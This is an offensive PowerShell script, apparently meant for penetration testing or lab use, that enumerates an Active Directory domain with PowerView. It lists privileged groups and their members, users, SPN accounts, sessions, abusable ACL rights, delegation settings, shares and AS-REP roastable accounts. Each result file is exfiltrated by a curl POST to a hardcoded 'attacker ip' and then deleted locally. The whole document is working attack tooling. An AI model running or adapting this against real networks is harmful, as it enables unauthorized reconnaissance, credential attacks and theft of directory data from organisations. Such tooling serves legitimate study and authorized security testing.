# Dependencies: Powerview.ps1, objectPermissions.ps1 (own), Import-ActiveDirectory.ps1 (AD Module), Microsoft.ActiveDirectory.Management.dll

# Custom: 
$script:saveInFile=$true
$script:sendingFile=$true
$script:interestingGroups= 'Domain Admins','Domain Controllers', 'Enterprise Admins', 'Remote Desktop Users','Remote Management Users',
'Backup Operators', 'Server Operators', 'Account Operators', 'Print Operators', 'Exchange Windows', 'AdminSDHolder' 
$script:interestingPrivileges="GenericALL","GenericWrite", "WriteOwner", "WriteDACL", "AllExtendedRights", "ForceChangePassword","Self"

# No Custom:
$script:file=''
$script:command={
    #script block code 
    whoami
}
$script:Path_ouDN=''

# Send file to remote destination 
function script:SendFile{
        Write-Output 'Sending file: '$file
	# Custom: Check command if works and/or change attacker ip
        cmd /c curl -X POST http://192.168.49.92/upload -F files=@$file
        Write-Output 'Sent file: ' $file
}

# Check actions if save and/or send files
function script:CheckActions(){
    if ( $saveInFile )
    {
        Write-Output 'Saving file: '$file
        Invoke-Command -ScriptBlock $command | Out-File -Encoding utf8 $file
        Write-Output 'Saved file: '$file
        if( [String]::IsNullOrWhiteSpace((Get-content $file)) )
        {
            Write-Output "Nothing to send: " $file
            Remove-Item $file
            return 1
        }
        if ( $sendingFile )
        {
            SendFile
            Remove-Item $file
        }
        
    }
    else 
    {
        & $command
    }
}




Write-Output '************ General info Current Domain ************'
$file='enum_currentDomain.txt'
$command = { 
    Get-NetDomain
} 
CheckActions


Write-Output '************ Current Domain SID ************'
$file='enum_currentDomainSID.txt'
$command = { 
    Get-DomainSID
} 
CheckActions


Write-Output '************ Domain Controllers ************'
$file='enum_domainControllers.txt'
$command = { 
    Get-NetDomainController | Select-Object name
} 
CheckActions


Write-Output '************ List Groups ************'
$file='enum_groups.txt'
$command = { 
    Get-NetGroup | Select-Object name, description
} 
CheckActions

# Members of interesting groups
foreach ($group in ((Get-NetGroup).cn))
{
    Write-Output '************ List members of group_'$group' ************'
    $file='enum_membersOfGroup_'+$group.replace(' ','')+'.txt'
    $command = { 
        Get-NetGroupMember -Identity $group -recurse | Select-Object MemberName, MemberObjectClass
    } 
    CheckActions
}


Write-Output '************ Account policies ************'
$file='enum_account_policies.txt'
$command = { 
    net accounts
} 
CheckActions


Write-Output '************ List GPOs ************'
$file='enum_GPOs.txt'
$command = { 
    Get-NetGPO | Select-Object displayname, gpcfilesyspath
} 
CheckActions

Write-Output '************ List OUs ************'
$file='enum_OUs.txt'
$command = { 
    Get-NetOu | Select-Object ou, distinguishedname
} 
CheckActions

# members of OU
foreach ($ou in (Get-ADOrganizationalUnit -Filter * -Properties *).DistinguishedName)
{
    Write-Output '************ List members of OUs '$ou' ************'
    $file='enum_membersOfOU_'+$ou.replace(' ','').replace(',','_')+'.txt'
    $Path_ouDN=$ou
    $command = { 
        Get-ADUser -Filter * -SearchBase $Path_ouDN | Select-object SamAccountName
    } 
    CheckActions
}


Write-Output '************ List hostnames ************'
$file='enum_hostnames.txt'
$command = { 
    Get-NetComputer | Select-Object operatingsystem,operatingsystemversion,dnshostname,distinguishedname
} 
CheckActions


Write-Output '************ List hostnames IPs ************'
$file='enum_hostnamesIp.txt'
$command = { 
    foreach ($cn in $((Get-NetComputer).dnshostname)) 
    {
        Write-Output '**'([regex]::Match((ping -4 -n 1 $cn | findstr -i "Pinging"), '\[(.*?)\]').Value).Trim("[]")$cn
    }
} 
CheckActions


Write-Output '************ List users ************'
$file='enum_users.txt'
$command = { 
    (Get-NetUser).samaccountname
} 
CheckActions


Write-Output '************ List full info users ************'
$file='enum_full_info_users.txt'
$command = { 
    Get-NetUser
} 
CheckActions

Write-Output '************ List SPN accounts ************'
$file='enum_spn.txt'
$command = { 
    Get-NetUser -SPN | Select-Object cn, description, serviceprincipalname
} 
CheckActions


Write-Output '************ List sessions ************'
$file='enum_sessions.txt'
$command = { 
    Get-DomainComputer | Get-NetLoggedon | Select-Object UserName, ComputerName,LogonServer
} 
CheckActions


# Interesting privileges
foreach ($privilege in $interestingPrivileges)
{
    Write-Output '************ Privileges: '$privilege' ************'
    $file='enum_privileges_'+$privilege.replace(' ','')+'.txt'
    $command = { 
        $ObjectsCN = $(LDAPSearch -LDAPQuery "(objectCategory=*)").properties.cn -join ',' -split ','
        ObjectPermissions -OBJECTS $ObjectsCN -TYPEPERMISSIONS $privilege
    } 
    CheckActions
}

Write-Output '************ List computer UnConstrained delegations ************'
$file='enum_computer_unConstrained_delegations.txt'
$command = { 
    Get-NetComputer -UnConstrained
} 
CheckActions

Write-Output '************ List user UnConstrained delegations ************'
$file='enum_user_unConstrained_delegations.txt'
$command = { 
    Get-ADUser -Filter {TrustedForDelegation -eq $True}
} 
CheckActions

Write-Output '************ List user Constrained delegations ************'
$file='enum_user_Constrained_delegations.txt'
$command = { 
    Get-DomainUser -TrustedToAuth
} 
CheckActions

Write-Output '************ List computer Constrained delegations ************'
$file='enum_computer_constrained_delegations.txt'
$command = { 
    Get-NetComputer -TrustedToAuth
} 
CheckActions

Write-Output '************ List Shared Folders ************'
Find-DomainShare


Write-Output '************ List ASP-REP Roasting ************'
Get-DomainUser -PreauthNotRequired -Verbose


<# ¿Any ideas?
Write-Output '************ List Shared Folders ************'
if ( $saveInFile )
{
    $file='enum_shared_folders.txt'
    Find-DomainShare *>&1 | Out-File enum_shared_folders.txt
    if ( $sendingFile )
    {
        SendFile
    }
}
else 
{
    Find-DomainShare
}
#>